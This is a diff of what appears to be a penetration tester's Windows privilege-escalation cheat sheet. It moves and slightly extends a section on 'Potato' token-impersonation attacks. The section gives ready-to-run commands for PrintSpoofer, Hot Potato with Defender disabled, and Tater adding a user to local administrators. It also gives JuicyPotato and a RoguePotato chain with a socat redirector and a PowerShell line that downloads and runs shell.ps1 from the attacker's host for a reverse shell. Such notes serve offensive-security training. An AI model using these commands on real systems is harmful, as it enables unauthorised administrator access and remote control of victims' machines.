@@ -19,9 +19,9 @@
     netsh firewall show config
  
 ### Windows Kernel Versions 
-Kernel 6.1 - Windows 7 / Windows Server 2008 R2 
-Kernel 6.2 - Windows 8 / Windows Server 2012
-Kernel 6.3 - Windows 8.1 / Windows Server 2012 R2
+Kernel 6.1 - Windows 7 / Windows Server 2008 R2  
+Kernel 6.2 - Windows 8 / Windows Server 2012  
+Kernel 6.3 - Windows 8.1 / Windows Server 2012 R2 
 Kernel 10 - Windows 10 / Windows Server 2016 / Windows Server 2019 / Windows 11 / Windows Server 2022
  
 
@@ -71,6 +71,55 @@ ____
 
 # Manual Enum 
 https://lolbas-project.github.io/#   
+
+## Privilige Exploits 
+
+[Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)   
+
+    whoami /priv
+    SeImpersonatePrivilige -> PrintSpoofer, Juicy Potato, Rogue Potato, Hot Potato
+    SeAssignPrimaryToken -> Juicy Potato 
+    SeTakeOwnership ->  become the owner of any object and modify the DACL to grant access.
+
+    If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
+    If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
+
+### PrintSpoofer 
+SeImpersonatePrivilige. Windows Server 2016, Server 2019, and Windows 10. 
+[Print Spoofer](https://github.com/itm4n/PrintSpoofer)  
+[Compiled exe](https://github.com/dievus/printspoofer)  
+
+     PrintSpoofer.exe -i -c cmd
+
+### Hot Potato (Original)    
+SeImpersonatePrivilige
+Windows 7, 8, 10, Server 2008, and Server 2012. Patched. 
+exe: [Potato](https://github.com/foxglovesec/Potato/)     
+
+     Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true  
+     
+Powershell: [Tater](https://github.com/Kevin-Robertson/Tater). Need to bypass powershell execution policy. Upload Tater and import.    
+     Import-Module Tater.ps1 
+     Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"   
+
+### Juicy Potato   
+Look for SeImpersonate or SeAssignPrimaryToken 
+[binaries](https://github.com/ohpe/juicy-potato)  
+[CLSIDS](http://ohpe.it/juicy-potato/CLSID/)   
+
+     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+
+### Rogue Potato   
+[Blog post](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)   
+[Code](https://github.com/antonioCoco/RoguePotato)  
+
+run redirector on kali and exe on victim:
+
+     socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
+     .\RoguePotato.exe -r YOUR_IP -e "command" -l 9999   
+     test cmd: -e "cmd.exe /c ping YOUR_IP"  
+     shell cmd: -e "powershell -c iex( iwr http://[YOUR_IP]/shell.ps1 -UseBasicParsing )"   
+     using nishang web shell 
     
 ## Service Exploits 
     tasklist /svc 
@@ -186,54 +235,6 @@ Mimikatz:
      
 *then crack hashes or use pass the hash to login* 
 [Online hash cracker](https://crackstation.net/) 
-
-## Privilige Exploits 
-
-
-
-[Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)   
-
-    whoami /priv
-    SeImpersonatePrivilige -> PrintSpoofer, Hot Potato 
-    If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
-    If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
-
-### PrintSpoofer 
-SeImpersonatePrivilige. Windows Server 2016, Server 2019, and Windows 10. 
-[Print Spoofer](https://github.com/itm4n/PrintSpoofer)  
-[Compiled exe](https://github.com/dievus/printspoofer)  
-
-     PrintSpoofer.exe -i -c cmd
-
-### Hot Potato (Original)    
-SeImpersonatePrivilige
-Windows 7, 8, 10, Server 2008, and Server 2012. Patched. 
-exe: [Potato](https://github.com/foxglovesec/Potato/)     
-
-     Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true  
-     
-Powershell: [Tater](https://github.com/Kevin-Robertson/Tater). Need to bypass powershell execution policy. Upload Tater and import.    
-     Import-Module Tater.ps1 
-     Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"   
-
-### Juicy Potato   
-Look for SeImpersonate or SeAssignPrimaryToken 
-[binaries](https://github.com/ohpe/juicy-potato)  
-[CLSIDS](http://ohpe.it/juicy-potato/CLSID/)   
-
-     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
-
-### Rogue Potato   
-[Blog post](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)   
-[Code](https://github.com/antonioCoco/RoguePotato)  
-
-run redirector on kali and exe on victim:
-
-     socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
-     .\RoguePotato.exe -r YOUR_IP -e "command" -l 9999   
-     test cmd: -e "cmd.exe /c ping YOUR_IP"  
-     shell cmd: -e "powershell -c iex( iwr http://[YOUR_IP]/shell.ps1 -UseBasicParsing )"   
-     using nishang web shell 
      
 
 ## Kernel exploits   
